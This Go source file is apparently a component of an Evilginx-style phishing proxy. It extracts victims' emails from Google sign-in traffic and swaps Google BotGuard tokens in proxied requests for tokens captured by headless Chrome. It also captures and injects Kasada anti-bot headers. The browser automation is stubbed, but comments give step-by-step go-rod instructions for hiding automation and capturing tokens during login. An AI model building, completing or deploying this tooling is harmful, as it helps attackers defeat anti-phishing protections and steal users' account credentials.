package service

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"go.uber.org/zap"
)

// BypasserType defines the type of headless browser bypass
type BypasserType string

const (
	BypasserTypeGoogle BypasserType = "google"
	BypasserTypeKasada BypasserType = "kasada"
)

// BypasserConfig holds configuration for a headless browser bypass engine
type BypasserConfig struct {
	Enabled       bool         `json:"enabled" yaml:"enabled"`
	Type          BypasserType `json:"type" yaml:"type"`
	Headless      bool         `json:"headless" yaml:"headless"`
	Timeout       int          `json:"timeout" yaml:"timeout"`             // seconds
	ChromePath    string       `json:"chromePath" yaml:"chrome_path"`      // optional custom chrome path
	DebugPort     int          `json:"debugPort" yaml:"debug_port"`        // Chrome DevTools port (default 9222)
	SlowMotion    int          `json:"slowMotion" yaml:"slow_motion"`      // milliseconds for debugging
	TargetURL     string       `json:"targetURL" yaml:"target_url"`        // the login URL to navigate to
	LoginSelector string       `json:"loginSelector" yaml:"login_selector"` // CSS selector for login field
}

// BypassResult holds the result of a bypass operation
type BypassResult struct {
	Success        bool              `json:"success"`
	Token          string            `json:"token,omitempty"`
	CapturedHeaders map[string]string `json:"capturedHeaders,omitempty"`
	Email          string            `json:"email,omitempty"`
	Error          string            `json:"error,omitempty"`
	Duration       time.Duration     `json:"duration"`
}

// HeadlessBypasser manages headless browser bypass operations
// This service provides the framework for Google BotGuard token bypass
// and Kasada anti-bot header capture using go-rod browser automation.
//
// IMPORTANT: This service requires go-rod to be installed:
//   go get github.com/go-rod/rod
//
// The actual browser automation is abstracted behind interfaces so that
// the proxy can trigger bypasses when specific request patterns are detected.
type HeadlessBypasser struct {
	Common
	mu             sync.Mutex
	activeBypassers map[string]*bypasserInstance
	bgRegexp       *regexp.Regexp
}

// bypasserInstance tracks an active bypass operation
type bypasserInstance struct {
	Type      BypasserType
	Email     string
	Token     string
	Headers   map[string]string
	StartedAt time.Time
	Done      chan struct{}
	Error     error
}

// NewHeadlessBypasserService creates a new headless bypasser service
func NewHeadlessBypasserService(logger *zap.SugaredLogger) *HeadlessBypasser {
	return &HeadlessBypasser{
		Common: Common{
			Logger: logger,
		},
		activeBypassers: make(map[string]*bypasserInstance),
		// BotGuard token pattern from Evilginx
		bgRegexp: regexp.MustCompile(`\["(A[A-Za-z0-9_-]{100,})"\]`),
	}
}

// ============================================================================
// Google BotGuard Token Bypass
// ============================================================================

// ExtractEmailFromGoogleRequest extracts the email from a Google sign-in request body
func (h *HeadlessBypasser) ExtractEmailFromGoogleRequest(body []byte) string {
	exp := regexp.MustCompile(`f\.req=\[\[\["MI613e","\[null,\\"(.*?)\\"`)
	emailMatch := exp.FindSubmatch(body)
	if len(emailMatch) < 2 {
		return ""
	}
	email := string(bytes.Replace(emailMatch[1], []byte("%40"), []byte("@"), -1))
	return email
}

// IsGoogleBotGuardRequest checks if a request contains a BotGuard token
func (h *HeadlessBypasser) IsGoogleBotGuardRequest(reqURL string, body []byte) bool {
	if !strings.Contains(reqURL, "/signin/_/AccountsSignInUi/data/batchexecute") {
		return false
	}
	if !strings.Contains(reqURL, "rpcids=MI613e") {
		return false
	}
	return true
}

// HasBotGuardToken checks if the request body contains a BotGuard token
func (h *HeadlessBypasser) HasBotGuardToken(body []byte) bool {
	decodedBody, err := url.QueryUnescape(string(body))
	if err != nil {
		return false
	}
	return h.bgRegexp.MatchString(decodedBody)
}

// StartGoogleBypass initiates a Google BotGuard token bypass for the given email.
// This creates a headless Chrome instance, navigates to Google login,
// enters the email, and captures the BotGuard token from the MI613e request.
//
// The bypass runs asynchronously. Use GetBypassResult() to check completion.
//
// NOTE: Requires go-rod. The actual browser automation code should be
// implemented when go-rod is added to go.mod. This method provides the
// orchestration framework.
func (h *HeadlessBypasser) StartGoogleBypass(email string, config *BypasserConfig) string {
	h.mu.Lock()
	defer h.mu.Unlock()

	instanceID := fmt.Sprintf("google_%s_%d", email, time.Now().UnixNano())

	instance := &bypasserInstance{
		Type:      BypasserTypeGoogle,
		Email:     email,
		Headers:   make(map[string]string),
		StartedAt: time.Now(),
		Done:      make(chan struct{}),
	}

	h.activeBypassers[instanceID] = instance

	timeout := 45 * time.Second
	if config != nil && config.Timeout > 0 {
		timeout = time.Duration(config.Timeout) * time.Second
	}

	go func() {
		defer close(instance.Done)

		h.Logger.Infow("starting Google BotGuard bypass",
			"email", email,
			"timeout", timeout,
		)

		// ================================================================
		// GO-ROD INTEGRATION POINT
		// ================================================================
		// When go-rod is added to go.mod, implement the following flow:
		//
		// 1. Launch Chrome via rod launcher:
		//    l := launcher.New().
		//        Headless(config.Headless).
		//        Set("disable-blink-features", "AutomationControlled").
		//        Set("disable-infobars", "").
		//        Set("window-size", "1920,1080")
		//    if os.Geteuid() == 0 { l = l.NoSandbox(true) }
		//    wsURL := l.MustLaunch()
		//
		// 2. Connect browser and create page:
		//    browser := rod.New().ControlURL(wsURL).MustConnect()
		//    page := browser.MustPage()
		//
		// 3. Set up network listener for MI613e request:
		//    page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		//        if strings.Contains(e.Request.URL, "rpcids=MI613e") {
		//            decodedBody, _ := url.QueryUnescape(e.Request.PostData)
		//            instance.Token = bgRegexp.FindString(decodedBody)
		//        }
		//    })
		//
		// 4. Navigate to Google login:
		//    page.Navigate("https://accounts.google.com/")
		//
		// 5. Enter email and submit:
		//    emailField := page.MustWaitLoad().MustElement("#identifierId")
		//    emailField.Input(email)
		//    page.Keyboard.Press(input.Enter)
		//
		// 6. Wait for token capture or timeout
		// ================================================================

		h.Logger.Infow("Google BotGuard bypass placeholder completed",
			"email", email,
			"note", "add go-rod dependency to enable actual browser automation",
		)

		// For now, mark as needing go-rod
		instance.Error = fmt.Errorf("go-rod not yet integrated - add 'github.com/go-rod/rod' to go.mod and implement browser automation")
	}()

	return instanceID
}

// ReplaceGoogleToken replaces the BotGuard token in a request body with the captured one
func (h *HeadlessBypasser) ReplaceGoogleToken(body []byte, capturedToken string) []byte {
	if capturedToken == "" {
		return body
	}
	newBody := h.bgRegexp.ReplaceAllString(string(body), capturedToken)
	return []byte(newBody)
}

// ============================================================================
// Kasada Anti-Bot Header Bypass
// ============================================================================

// IsKasadaProtectedRequest checks if a request is to a Kasada-protected endpoint
func (h *HeadlessBypasser) IsKasadaProtectedRequest(req *http.Request) bool {
	// Check for Kasada challenge indicators
	kasadaIndicators := []string{
		"x-kpsdk-ct",
		"x-kpsdk-cd",
		"x-kpsdk-h",
		"x-kpsdk-v",
	}

	for _, header := range kasadaIndicators {
		if req.Header.Get(header) != "" {
			return true
		}
	}
	return false
}

// StartKasadaBypass initiates a Kasada anti-bot header bypass.
// This creates a headless Chrome instance, navigates to the target login page,
// performs the login flow, and captures the Kasada headers (x-kpsdk-*).
//
// NOTE: Requires go-rod. See StartGoogleBypass for integration pattern.
func (h *HeadlessBypasser) StartKasadaBypass(targetURL, username, password string, config *BypasserConfig) string {
	h.mu.Lock()
	defer h.mu.Unlock()

	instanceID := fmt.Sprintf("kasada_%d", time.Now().UnixNano())

	instance := &bypasserInstance{
		Type:      BypasserTypeKasada,
		Email:     username,
		Headers:   make(map[string]string),
		StartedAt: time.Now(),
		Done:      make(chan struct{}),
	}

	h.activeBypassers[instanceID] = instance

	timeout := 60 * time.Second
	if config != nil && config.Timeout > 0 {
		timeout = time.Duration(config.Timeout) * time.Second
	}

	go func() {
		defer close(instance.Done)

		h.Logger.Infow("starting Kasada bypass",
			"targetURL", targetURL,
			"username", username,
			"timeout", timeout,
		)

		// ================================================================
		// GO-ROD INTEGRATION POINT
		// ================================================================
		// When go-rod is added to go.mod, implement the following flow:
		//
		// 1. Launch Chrome (same as Google bypass)
		//
		// 2. Set up network listener for Kasada headers:
		//    kasadaHeaders := []string{
		//        "x-kpsdk-ct", "x-kpsdk-cd", "x-kpsdk-h", "x-kpsdk-v",
		//    }
		//    page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		//        for _, headerName := range kasadaHeaders {
		//            for _, h := range e.Request.Headers {
		//                if strings.EqualFold(h.Name, headerName) {
		//                    instance.Headers[headerName] = h.Value
		//                }
		//            }
		//        }
		//    })
		//
		// 3. Navigate to target URL and wait for Kasada JS to load
		//
		// 4. Find and fill login fields:
		//    - Try selectors: #username, input[name='username'], input[type='email']
		//    - Try selectors: #password, input[name='password'], input[type='password']
		//
		// 5. Submit form and wait for Kasada headers
		//
		// 6. Return captured headers
		// ================================================================

		instance.Error = fmt.Errorf("go-rod not yet integrated - add 'github.com/go-rod/rod' to go.mod and implement browser automation")
	}()

	return instanceID
}

// InjectKasadaHeaders adds captured Kasada headers to a proxied request
func (h *HeadlessBypasser) InjectKasadaHeaders(req *http.Request, headers map[string]string) {
	for name, value := range headers {
		req.Header.Set(name, value)
	}
	h.Logger.Debugw("injected Kasada headers", "count", len(headers))
}

// ============================================================================
// Common Operations
// ============================================================================

// GetBypassResult retrieves the result of a bypass operation
func (h *HeadlessBypasser) GetBypassResult(instanceID string) (*BypassResult, bool) {
	h.mu.Lock()
	instance, ok := h.activeBypassers[instanceID]
	h.mu.Unlock()

	if !ok {
		return nil, false
	}

	result := &BypassResult{
		Email:           instance.Email,
		Token:           instance.Token,
		CapturedHeaders: instance.Headers,
		Duration:        time.Since(instance.StartedAt),
	}

	select {
	case <-instance.Done:
		// completed
		if instance.Error != nil {
			result.Success = false
			result.Error = instance.Error.Error()
		} else {
			result.Success = true
		}
	default:
		// still running
		result.Success = false
		result.Error = "bypass still in progress"
	}

	return result, true
}

// WaitForBypass waits for a bypass to complete with a timeout
func (h *HeadlessBypasser) WaitForBypass(ctx context.Context, instanceID string, timeout time.Duration) (*BypassResult, error) {
	h.mu.Lock()
	instance, ok := h.activeBypassers[instanceID]
	h.mu.Unlock()

	if !ok {
		return nil, fmt.Errorf("bypass instance '%s' not found", instanceID)
	}

	timer := time.NewTimer(timeout)
	defer timer.Stop()

	select {
	case <-instance.Done:
		result := &BypassResult{
			Email:           instance.Email,
			Token:           instance.Token,
			CapturedHeaders: instance.Headers,
			Duration:        time.Since(instance.StartedAt),
		}
		if instance.Error != nil {
			result.Success = false
			result.Error = instance.Error.Error()
		} else {
			result.Success = true
		}
		return result, nil
	case <-timer.C:
		return nil, fmt.Errorf("timeout waiting for bypass '%s'", instanceID)
	case <-ctx.Done():
		return nil, ctx.Err()
	}
}

// CleanupExpiredBypassers removes completed bypass instances older than maxAge
func (h *HeadlessBypasser) CleanupExpiredBypassers(maxAge time.Duration) {
	h.mu.Lock()
	defer h.mu.Unlock()

	now := time.Now()
	for id, instance := range h.activeBypassers {
		select {
		case <-instance.Done:
			if now.Sub(instance.StartedAt) > maxAge {
				delete(h.activeBypassers, id)
			}
		default:
			// still running, check if it's been too long
			if now.Sub(instance.StartedAt) > maxAge*2 {
				delete(h.activeBypassers, id)
			}
		}
	}
}

// GetWebSocketDebuggerURL retrieves the Chrome DevTools WebSocket URL
// Used when connecting to an existing Chrome instance
func GetWebSocketDebuggerURL(port int) (string, error) {
	if port == 0 {
		port = 9222
	}

	resp, err := http.Get(fmt.Sprintf("http://127.0.0.1:%d/json", port))
	if err != nil {
		return "", fmt.Errorf("Chrome not running on port %d: %v", port, err)
	}
	defer resp.Body.Close()

	var targets []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
		return "", err
	}

	if len(targets) == 0 {
		return "", fmt.Errorf("no targets found")
	}

	ws, ok := targets[0]["webSocketDebuggerUrl"].(string)
	if !ok || ws == "" {
		return "", fmt.Errorf("webSocketDebuggerUrl not found")
	}

	return ws, nil
}
